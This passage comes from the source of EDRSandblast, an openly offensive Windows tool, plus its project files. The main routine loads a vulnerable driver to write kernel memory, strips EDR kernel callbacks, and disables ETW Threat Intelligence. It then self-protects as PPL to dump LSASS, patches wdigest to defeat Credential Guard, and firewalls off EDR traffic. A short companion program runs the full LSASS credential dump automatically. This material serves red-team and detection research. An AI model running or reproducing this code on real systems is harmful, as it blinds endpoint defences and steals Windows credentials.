    }

    if (kernelMode) {
        _putts_or_not(TEXT("[===== KERNEL MODE =====]\n"));

        if (_tcslen(driverPath) == 0) {
            PathAppend(driverPath, currentFolderPath);
            PathAppend(driverPath, driverDefaultName);
        }
        if (!FileExists(driverPath)) {
            _tprintf_or_not(TEXT("[!] Required driver file not present at %s\nExiting...\n"), driverPath);
            return EXIT_FAILURE;
        }

        if (_tcslen(ntoskrnlOffsetCSVPath) == 0) {
            TCHAR offsetCSVName[] = TEXT("NtoskrnlOffsets.csv");
            PathAppend(ntoskrnlOffsetCSVPath, currentFolderPath);
            PathAppend(ntoskrnlOffsetCSVPath, offsetCSVName);
        }

        _putts_or_not(TEXT("[+] Setting up prerequisites for the kernel read/write primitives..."));
        // Initialize the global variable containing ntoskrnl.exe Notify Routines', _PS_PROTECTION and ETW TI functions offsets.
        if (FileExists(ntoskrnlOffsetCSVPath)) {
            _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
            LoadNtoskrnlOffsetsFromFile(ntoskrnlOffsetCSVPath);
            if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) { // (only check notify routines offsets, because ETW Ti might legitimately be absent on "old" Windows versions)
                _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ntoskrnl in use."));
            }
        }
        if (internet && !NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
            _putts_or_not(TEXT("[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
#if _DEBUG
            LoadNtoskrnlOffsetsFromInternet(FALSE);
#else
            LoadNtoskrnlOffsetsFromInternet(TRUE);
#endif
            if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
                _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
            }
            else {
                _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
                if (FileExists(ntoskrnlOffsetCSVPath)) {
                    _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
                    SaveNtoskrnlOffsetsToFile(ntoskrnlOffsetCSVPath);
                }
            }
        }
        if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
            _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. Aborting...\n"));
            return EXIT_FAILURE;
        }

        // Print the kernel offsets in verbose mode.
        if (verbose) {
            PrintNtoskrnlOffsets();
        }

        // Install the vulnerable driver to have read / write in Kernel memory.
        LPTSTR serviceNameIfAny = NULL;
        BOOL isDriverAlreadyRunning = IsDriverServiceRunning(driverPath, &serviceNameIfAny);
        if (isDriverAlreadyRunning){
            _putts_or_not(TEXT("[+] Vulnerable driver is already running!\n"));
            SetDriverServiceName(serviceNameIfAny);
        }
        else {
            _putts_or_not(TEXT("[+] Installing vulnerable driver..."));
            status = InstallVulnerableDriver(driverPath);
            if (status != TRUE) {
                _putts_or_not(TEXT("[!] An error occurred while installing the vulnerable driver"));
                _putts_or_not(TEXT("[*] Uninstalling the service and attempting the install again..."));
                Sleep(20000);
                CloseDriverHandle();
                status = UninstallVulnerableDriver();
                Sleep(2000);
                status = status && InstallVulnerableDriver(driverPath);
                Sleep(2000);
                if (status != TRUE) {
                    _putts_or_not(TEXT("[!] New uninstall / install attempt failed, make sure that there is no trace of the driver left..."));
                    return EXIT_FAILURE;
                }
            }
            Sleep(5000);// TODO : replace by a reliable method to check if the driver is ready
            _putts_or_not(TEXT("\n"));
        }

        // Checks if any EDR callbacks are configured. If no EDR callbacks are found, then dump LSASS / exec cmd / patch CredGuard. Ohterwise, remove the EDR callbacks and start a new (unmonitored) process executing itself to dump LSASS.
        _putts_or_not(TEXT("[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations..."));
        foundEDRDrivers = (struct FOUND_EDR_CALLBACKS*)calloc(1, sizeof(struct FOUND_EDR_CALLBACKS));
        if (!foundEDRDrivers) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
            return EXIT_FAILURE;
        }
        foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
        if (foundNotifyRoutineCallbacks) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
        _putts_or_not(TEXT(""));
        
        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication..."));
        foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
        _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
        if (foundObjectCallbacks) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
        _putts_or_not(TEXT(""));

        _putts_or_not(TEXT("[+] [ETWTI]\tChecking the ETW Threat Intelligence Provider state..."));
        ETWTIState = isETWThreatIntelProviderEnabled(verbose);
        _tprintf_or_not(TEXT("[+] [ETWTI]\tETW Threat Intelligence Provider is %s!\n"), ETWTIState ? TEXT("ENABLED") : TEXT("DISABLED"));
        _putts_or_not(TEXT(""));
        if (ETWTIState) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
    }

    if (startMode != audit) {

        if (isSafeToExecutePayloadKernelland && (isSafeToExecutePayloadUserland || directSyscalls)) {
            _putts_or_not(TEXT("[+] Process is \"safe\" to launch our payload\n"));

            // Do the operation the tool was started for.
            switch (startMode) {

            // Start a process executing cmd.exe.
            case cmd:
                _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
                    TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
                    TEXT("WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!\n"));
                // Find cmd.exe path.
                TCHAR systemDirectory[MAX_PATH] = { 0 };
                GetSystemDirectory(systemDirectory, _countof(systemDirectory));
                TCHAR cmdPath[MAX_PATH] = { 0 };
                _tcscat_s(cmdPath, _countof(cmdPath), systemDirectory);
                _tcscat_s(cmdPath, _countof(cmdPath), TEXT("\\cmd.exe"));
                _tsystem(cmdPath);
                break;

            // Dump the LSASS process in a new thread.
            case dump:
                if (kernelMode) {
                    if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
                        _putts_or_not(TEXT("\n[+] RunPPL bypass: Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) since PPL is supported by the OS. This will allow access to LSASS if RunAsPPL is enabled"));
                        SetCurrentProcessAsProtected(verbose);
                    }
                }

                _putts_or_not(TEXT("[+] Attempting to dump the process"));

                // Determine dump path based on specified process name.
                if (_tcslen(outputPath) == 0) {
                    TCHAR* processNameFilename = _tcsdup(processName);
                    PathRemoveExtension(processNameFilename);
                    _tcscat_s(outputPath, _countof(outputPath), currentFolderPath);
                    _tcscat_s(outputPath, _countof(outputPath), TEXT("\\"));
                    _tcscat_s(outputPath, _countof(outputPath), processNameFilename);
                    if (processNameFilename) {
                        free(processNameFilename);
                        processNameFilename = NULL;
                    }
                }
                else if (PathIsRelative(outputPath)) {
                    SIZE_T newOutputPathsZ = _tcslen(currentFolderPath) + _tcslen(TEXT("\\")) + _tcslen(outputPath) + 1;
                    TCHAR* newOutputPath = calloc(newOutputPathsZ, sizeof(TCHAR));
                    if (!newOutputPath) {
                        _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
                        lpExitCode = EXIT_FAILURE;
                        break;
                    }
                    _tcscat_s(newOutputPath, newOutputPathsZ, currentFolderPath);
                    _tcscat_s(newOutputPath, newOutputPathsZ, TEXT("\\"));
                    _tcscat_s(newOutputPath, newOutputPathsZ, outputPath);
                    _tcscpy_s(outputPath, _countof(outputPath), newOutputPath);
                    if (newOutputPath) {
                        free(newOutputPath);
                        newOutputPath = NULL;
                    }
                }

                HANDLE hThread = NULL;

                // Set arguments for function call through 
                PVOID* pThreatArguments = calloc(2, sizeof(PVOID));
                if (!pThreatArguments) {
                    _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
                    lpExitCode = EXIT_FAILURE;
                    break;
                }
                pThreatArguments[0] = processName;
                pThreatArguments[1] = outputPath;

                if (directSyscalls) {
                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
                }
                else {
                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
                }
                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    GetExitCodeThread(hThread, (PDWORD)&lpExitCode);
                    if (lpExitCode != 0) {
                        _putts_or_not(TEXT("[!] A fatal error occurred during the LSASS dump / execution of cmd.exe"));
                        lpExitCode = EXIT_FAILURE;
                    }
                }
                else {
                    _putts_or_not(TEXT("[!] An error occurred while attempting to start the new thread..."));
                    lpExitCode = EXIT_FAILURE;
                }
                if (pThreatArguments) {
                    free(pThreatArguments);
                    pThreatArguments = NULL;
                }
                break;

            // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
            case credguard:
                if (_tcslen(wdigestOffsetCSVPath) == 0) {
                    TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
                }

                if (FileExists(wdigestOffsetCSVPath)) {
                    _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
                    LoadWdigestOffsetsFromFile(wdigestOffsetCSVPath);
                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                        _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
                    }
                }
                if (internet && (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0)) {
                    _putts_or_not(TEXT("[+] Downloading wdigest related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
#if _DEBUG
                    LoadWdigestOffsetsFromInternet(FALSE);
#else
                    LoadWdigestOffsetsFromInternet(TRUE);
#endif
                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                        _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));

                    }
                    else {
                        _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
                        if (FileExists(wdigestOffsetCSVPath)) {
                            _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
                            SaveWdigestOffsetsToFile(wdigestOffsetCSVPath);
                        }
                    }
                }
                if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                    _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. LSASS won't be patched...\n"));
                    lpExitCode = EXIT_FAILURE;
                }
                else {
                    _putts_or_not(TEXT(""));
                    if (kernelMode) {
                        _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) if PPL are supported by the OS(Offset of _PS_PROTECTION exists). This will allow lsass access is RunAsPPL is enabled"));
                        if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
                            SetCurrentProcessAsProtected(verbose);
                        }
                    }
                    if (disableCredGuardByPatchingLSASS()) {
                        _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
                    }
                    else {
                        _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
                        lpExitCode = EXIT_FAILURE;
                    }
                }
                break;

            // Add firewall rules to block EDR network communications.
            case firewall:
            {
                hrStatus = S_OK;
                fwBlockingRulesList sFWEntries = { 0 };

                _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n"));
                hrStatus = FirewallBlockEDR(&sFWEntries);
                if (FAILED(hrStatus)) {
                    _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n"));
                }
                else {
                    _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));

                }
                _tprintf_or_not(TEXT("\n"));
                FirewallPrintManualDeletion(&sFWEntries);
                break;
            }
            }
            _putts_or_not(TEXT(""));
        }

        // If the the payload is not safe to execute.
        else {
            if (WasRestarted()) {
                _tprintf_or_not(TEXT("Something failed, cannot perform safely execute payload. Aborting...\n"));
                exit(1);
            }
            _putts_or_not(TEXT("[+] Process is NOT \"safe\" to launch our payload, removing monitoring and starting another process...\n"));
#ifdef _DEBUG
            assert(kernelMode);
#endif
            /*
            * 1/3 : Removing kernel-based monitoring.
            */
            // Disable (temporarily) ETW Threat Intel functions by patching the ETW Threat Intel provider ProviderEnableInfo.
            if (ETWTIState) {
                DisableETWThreatIntelProvider(verbose);
                _putts_or_not(TEXT(""));
            }
            // If kernel callbacks are monitoring processes, we remove them and start a new process.
            if (foundNotifyRoutineCallbacks) {
                _putts_or_not(TEXT("[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading..."));
                RemoveEDRNotifyRoutineCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }
            if (foundObjectCallbacks) {
                _putts_or_not(TEXT("[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication..."));
                DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }

            /*
            * 2/3 : Starting "resursively" our process.
            */
            // Re-executing the present binary, without any kernel callback nor ETWTI enabled.
            _putts_or_not(TEXT("[+] All EDR drivers were successfully removed from Kernel callbacks!\n\n==================================================\nStarting a new unmonitored process...\n==================================================\n"));
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            memset(&pi, 0, sizeof(pi));
            // Pass the same argument as the parent process.
            TCHAR* currentCommandLine = GetCommandLine();
            CloseDriverHandle();
            if (CreateProcess(argv[0], currentCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else {
                _putts_or_not(TEXT("[!] An error occured while trying to create a new process"));
                lpExitCode = EXIT_FAILURE;
            }
            _putts_or_not(TEXT("\n"));

            /*
            * 3/3 : Restoring state after execution.
            */
            // By default, restore the removed EDR kernel callbacks. restoreCallbacks set to FALSE if the no restore CLI flag is set.
            if (restoreCallbacks == TRUE && foundNotifyRoutineCallbacks) {
                _putts_or_not(TEXT("[+] Restoring EDR's kernel notify routine callbacks..."));
                RestoreEDRNotifyRoutineCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }
            if (restoreCallbacks == TRUE && foundObjectCallbacks) {
                _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
                EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }

            // Renable the ETW Threat Intel provider.
            // TODO : make this conditionnal, just as kernel callbacks restoring ?
            if (ETWTIState) {
                EnableETWThreatIntelProvider(verbose);
                _putts_or_not(TEXT(""));
            }

            if (foundEDRDrivers) {
                free(foundEDRDrivers);
                foundEDRDrivers = NULL;
            }
        }
    }

    if (kernelMode && removeVulnDriver) {
        // Sleep(5000); // TODO : replace by a reliable method to check if the driver is ready
        _putts_or_not(TEXT("[*] Uninstalling vulnerable driver..."));
        CloseDriverHandle();
        status = UninstallVulnerableDriver();
        if (status == FALSE) {
            _putts_or_not(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver"));
            _tprintf_or_not(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), GetDriverServiceName());
            lpExitCode = EXIT_FAILURE;
        }
        else {
            _putts_or_not(TEXT("[+] The vulnerable driver was successfully uninstalled!"));
        }
    }

    return lpExitCode;
}

```

`EDRSandblast_CLI/EDRSandblast_CLI.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast.c" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ffa0fdde-be70-49e4-97de-753304ef1113}</ProjectGuid>
    <RootNamespace>EDRSandblastCLI</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <IncludePath>$(SolutionDir)\EDRSandblast\Includes;$(IncludePath)</IncludePath>
    <LibraryPath>$(LibraryPath)</LibraryPath>
    <TargetName>EDRSandblast</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <IncludePath>$(SolutionDir)\EDRSandblast\Includes;$(IncludePath)</IncludePath>
    <LibraryPath>$(LibraryPath)</LibraryPath>
    <TargetName>EDRSandblast</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>$(SolutionDir)$(Platform)\$(Configuration)\EDRSandblast_Core.lib;Dbghelp.lib;Version.lib;Winhttp.lib;Pathcch.lib;Shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <IgnoreSpecificDefaultLibraries>libcmtd.lib</IgnoreSpecificDefaultLibraries>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>$(SolutionDir)$(Platform)\$(Configuration)\EDRSandblast_Core.lib;Dbghelp.lib;Version.lib;Winhttp.lib;Pathcch.lib;Shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <IgnoreSpecificDefaultLibraries>libcmtd.lib</IgnoreSpecificDefaultLibraries>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`EDRSandblast_CLI/EDRSandblast_CLI.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`EDRSandblast_LsassDump/EDRSandblast_LsassDump.c`:

```c
#include "../EDRSandblast_StaticLibrary/EDRSandblast_API.h"
#include <stdio.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "EDRSandblast_Core.lib")
#pragma comment(lib, "EDRSandblast_StaticLibrary.lib")
#pragma comment(lib, "Shlwapi.lib")


int main()
{
    EDRSB_CONTEXT ctx = { 0 };
    EDRSB_CONFIG cfg = { 0 };
    cfg.bypassMode.Usermode = TRUE;
    cfg.bypassMode.Krnlmode = TRUE;
    cfg.offsetRetrievalMethod.Internet = TRUE;
    cfg.offsetRetrievalMethod.File = TRUE;

    EDRSB_STATUS status;
    if (status = EDRSB_Init(&ctx, &cfg) != EDRSB_SUCCESS) {
        printf("EDRSB_Init: %u", status);
    }
    Usermode_RemoveAllMonitoring(&ctx, EDRSB_UMTECH_Find_and_use_existing_trampoline);
    Krnlmode_RemoveAllMonitoring(&ctx);
    Action_DumpProcessByName(&ctx, L"lsass.exe", L"C:\\temp\\tmp.tmp", EDRSB_UMTECH_Find_and_use_existing_trampoline);
    Krnlmode_RestoreAllMonitoring(&ctx);
    EDRSB_CleanUp(&ctx);
}

```

`EDRSandblast_LsassDump/EDRSandblast_LsassDump.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{04dfb6e4-809e-4c35-88a1-2cc5f1ebfebd}</ProjectGuid>
    <RootNamespace>EDRSandblastLsassDump</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
